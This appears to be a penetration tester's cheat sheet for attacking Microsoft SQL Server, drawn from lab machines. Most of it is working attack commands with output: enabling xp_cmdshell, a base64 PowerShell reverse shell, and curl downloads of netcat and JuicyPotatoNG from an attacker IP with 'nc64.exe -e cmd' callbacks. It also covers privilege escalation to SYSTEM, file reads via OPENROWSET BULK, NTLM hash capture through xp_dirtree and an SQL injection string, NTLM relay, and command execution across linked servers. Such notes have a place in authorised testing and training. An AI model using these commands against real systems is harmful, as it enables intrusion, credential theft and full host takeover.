## # `MSSQL` -

- You can connect to the MSSQL server using the [Impacket](https://github.com/SecureAuthCorp/impacket) tool `mssqlclient.py` :

```bash
mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb
```

- MSSQL Version :

```sql
select @@version;
```

- Current user :

```sql
select user_name();
```

- Checking all Users :

```sql
SELECT name FROM master..syslogins
```

- Checking Admins :

```sql
SELECT name FROM master..syslogins WHERE sysadmin = '1';
```

- Enumerating your privilege :

```sql
SELECT entity_name, permission_name FROM fn_my_permissions(NULL, 'SERVER');
```

- Enumerating databases on the server :

```sql
SQL (PublicUser guest@master)> select name from master..sysdatabases;
name     
------   
master   
tempdb   
model    
msdb  
```

These are the four default databases on MSSQL.

```sql
use master;
```

```sql
select * from master.information_schema.tables;
```

- Current Database :

```sql
SELECT DB_NAME();
```

## # `xp_cmdshell` -

Running commands through MSSQL server using the `xp_cmdshell` stored procedure -

```sql
SQL (PublicUser  guest@master)> xp_cmdshell whoami
[-] ERROR(DC1): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
```

 You can reconfigure that with the [following four lines](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver16) :

```sql
SQL> EXECUTE sp_configure 'show advanced options', 1
[*] INFO(DC1): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE
SQL> EXECUTE sp_configure 'xp_cmdshell', 1
[*] INFO(DC1): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE
```

Now it should work -

```sql
SQL> xp_cmdshell whoami
output

--------------------------------------------------------------------------------

scrm\sqlsvc

NULL
```

But you will still fail if the account doesn’t have permission :

```sql
SQL (PublicUser  guest@master)> EXECUTE sp_configure 'show advanced options', 1
[-] ERROR(DC\SQLMOCK): Line 105: User does not have permission to perform this action.
```

## # `Reverse Shell` -

 Visit [revshells.com](https://www.revshells.com/) and update it with your IP and port. Filter by windows and select PowerShell #3 (Base64). Base64 one because you don’t have to worry about bad characters in the MSSQL command line.

```sql
SQL> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC
<Snip>
```

Start your listener and catch your shell -

```bash
sudo rlwrap -cAr nc -lvnp 443
```

## # `SeImpersonatePrivilege` -

If Mssql has SeImpersonatePrivilege Enabled you can exploit to get a reverse shell via Juicy Potato :

```sql
SQL> xp_cmdshell whoami /priv
output
--------------------------------------------------------------------------------
NULL
PRIVILEGES INFORMATION
----------------------
NULL
Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
NULL
```

Grab  [JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG) 

Download the compiled exe from the [release page](https://github.com/antonioCoco/JuicyPotatoNG/releases/latest), and serve it from your webserver along with two other files :

- `nc64.exe`, to get a reverse shell
- `rev.bat`, which simply invokes `nc64.exe` to return a reverse shell to your VM :

```bash
C:\\programdata\\nc64.exe -e cmd 10.10.14.6 443
```

Upload all three to victim machine -

```bash
SQL> xp_cmdshell powershell curl 10.10.14.6/nc64.exe -outfile C:\\programdata\\nc64.exe
output
--------------------------------------------------------------------------------
NULL
SQL> xp_cmdshell powershell curl 10.10.14.6/rev.bat -outfile C:\\programdata\\rev.bat
output
--------------------------------------------------------------------------------
NULL
SQL> xp_cmdshell powershell curl 10.10.14.6/JuicyPotatoNG.exe -outfile C:\\programdata\\jp.exe
output
--------------------------------------------------------------------------------
NULL
```

Now with `nc` listening on your host, Invoke JuicyPotatoNG :

```bash
SQL> xp_cmdshell C:\\programdata\\jp.exe -t * -p C:\\programdata\\rev.bat
output
--------------------------------------------------------------------------------
NULL
NULL
         JuicyPotatoNG
         by decoder_it & splinter_code
NULL
[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 10247
[+] authresult success {854A20FB-2D44-457D-992F-EF13785D2B51};NT AUTHORITY\SYSTEM;Impersonation
[+] CreateProcessWithTokenW OK
[+] Exploit successful!
NULL 
```

If reports success as above, there will be a shell running as SYSTEM at `nc` :

```bash
nap@hacky$ rlwrap -cAr nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.168 63184
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

---
Another way to abuse SeImpersonate is using :

[EfsPotato](https://github.com/zcgonvh/EfsPotato/blob/master/EfsPotato.cs)

Download the single file, `EfsPotato.cs` from [GitHub](https://github.com/zcgonvh/EfsPotato/blob/master/EfsPotato.cs) to your Windows VM. There are compile instructions on the readme, and they are very simple. I had success using the v4 .NET compiler :

```powershell
PS > C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe efspotato.cs
Microsoft (R) Visual C# Compiler version 4.8.4084.0
for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.

This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240

efspotato.cs(103,29): warning CS0618: 'System.IO.FileStream.FileStream(System.IntPtr, System.IO.FileAccess, bool)' is
        obsolete: 'This constructor has been deprecated.  Please use new FileStream(SafeFileHandle handle, FileAccess
        access) instead, and optionally make a new SafeFileHandle with ownsHandle=false if needed.
        http://go.microsoft.com/fwlink/?linkid=14202'
```

The warnings can be ignored.

Running this is quite simple - it just needs the command that you want to run as SYSTEM. For example :

```powershell
CMD MSSQL$SQLEXPRESS@PIVOTAPI C:\ProgramData> .\efs.exe whoami
Exploit for EfsPotato(MS-EFSR EfsRpcOpenFileRaw with SeImpersonatePrivilege local privilege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.

[+] Current user: NT Service\MSSQL$SQLEXPRESS
[!]binding ok (handle=1045990)
[+] Get Token: 748
[!] process with pid: 3980 created.
==============================
nt authority\system
```

## # `SeManageVolumePrivilege` -

```sql
CMD MSSQL$SQLEXPRESS@PIVOTAPI C:\Windows\system32> whoami 
nt service\mssql$sqlexpress

CMD MSSQL$SQLEXPRESS@PIVOTAPI C:\Windows\system32> whoami /priv

INFORMACIÓN DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripción                                       Estado       
============================= ================================================= =============
SeManageVolumePrivilege       Realizar tareas de mantenimiento del volumen      Habilitada   
```

Download [xct’s repo](https://github.com/xct/SeManageVolumeAbuse/blob/main/SeManageVolumeAbuse/SeManageVolumeAbuse.cpp) and open it in Visual Studio in your Windows VM. Make sure to set the build to Release x64, and then build the project.

```sql
CMD MSSQL$SQLEXPRESS@PIVOTAPI C:\ProgramData> .\v
Success! Permissions changed.
CMD MSSQL$SQLEXPRESS@PIVOTAPI C:\ProgramData> type C:\users\cybervaca\desktop\root.txt
b32c5e3e************************
```

## # `Reading files via BULK` -

[This post on MSSQL Tips](https://www.mssqltips.com/sqlservertip/1643/using-openrowset-to-read-large-files-into-sql-server/) talks about how to read a file using MSSQL using the `BULK` option, which was added to SQL Server 2005.

```bash
SQL> SELECT BulkColumn FROM OPENROWSET(BULK 'C:\users\administrator\desktop\root.txt', SINGLE_CLOB) MyFile
BulkColumn

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   

b'a01b823bd0d7c97c98646d36d1d03c02\r\n' 
```

`OPENROWSET` returns a single column named `BulkColumn`. `MyFile` is a correlation name, which isn’t really important here other than it must exist, and it doesn’t really matter what I put there.

`OPENROWSET`, when used with the `BULK` provider takes a file path and one of three keywords:

- `SINGLE_BLOB` returns as a `varbinary`
- `SINGLE_CLOB` returns as a `varchar`
- `SINGLE_NCLOB` returns as a `nvarchar`

## # `Ntlm Challenge/Response` -

Get the SQL server to connect back to your host and authenticate, and capture a challenge / response that you can try to brute force.

Start [Responder](https://github.com/lgandx/Responder)  as root listening on a bunch of services for the `tun0` interface :

```bash
napster@hacky$ sudo python3 Responder.py -I tun0
...[snip]...
[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
...[snip]...
```

Now tell MSSQL to read a file on a share on your local host :

```sql
SQL (PublicUser  guest@master)> EXEC xp_dirtree '\\10.10.14.6\share', 1, 1
subdirectory   depth   file   
------------   -----   ----
```

It returns nothing, but at Responder there will be a “hash”.

---

You can also use smb server for catching the hash :

Start smb server on your Kali -

```bash
impacket-smbserver share share -smb2support
```

From victim windows machine -

```bash
exec xp_dirtree '\\10.8.0.36\share'
```

Now you can try to crack the captured hashes using john or other tool. 

---

You can also use the following to capture ntlm hash via sql injection :

```sql
abcd'; use master; exec xp_dirtree '\\10.10.14.6\share';-- -
```

## # `Ntlm Relay`

If the captured hash is not crackable you can go for Ntlm Relay Attack that is forwarding the hash to authenticate.

```bash
impacket-ntlmrelayx -tf targets.txt -socks -smb2support
```

targets.txt contains the Ip address you want access to.

Capture the hash as shown above already :

```bash
exec xp_dirtree '\\10.8.0.36\share'
```

Impacket should have captured the hash and spawned a sock server and everything that you send through the sock server will be forwarded in the context of the user(MSSql).

You can now use proxychains -

```bash
proxychains smbclient -L \\\\10.10.150.53 -U domainname/mssqlusername 
```

## # `MSSQL Powershell` -

[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) 

• Discovery (SPN Scanning) :

```powershell
Get-SQLInstanceDomain
```

• Check Accessibility :

```powershell
Get-SQLConnectionTestThreaded
```

```powershell
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded - Verbose
```

• Gather Information :

```powershell
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

## # `Trust Abuse - MSSQL Servers - Database Links` -

A database link allows a SQL Server to access external data sources likeother SQL Servers and OLE DB data sources.In case of database links between SQL servers, that is, linked SQL servers it is possible to execute stored procedures.Database links work even across forest trusts.

• Look for links to remote servers :

```powershell
Get-SQLServerLink -Instance dcorp-mssql -Verbose
```

```powershell
select * from master..sysservers
```

- Enumerating Database Links :

```powershell
select * from openquery("dcorp-sql1",'select * from master..sysservers')
```

```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose
```

• Openquery queries can be chained to access links within links (nested links) :

```powershell
select * from openquery("dcorp-sql1",'select * from openquery("dcorpmgmt",''select * from master..sysservers'')')
```

- Executing Commands :

```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget eu-sql
```

• From the initial SQL server, OS commands can be executed using nested link queries :

```powershell
select * from openquery("dcorp-sql1",'select * from openquery("dcorpmgmt",''select * from openquery("eu-sql.eu.eurocorp.local",''''select @@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')')
```

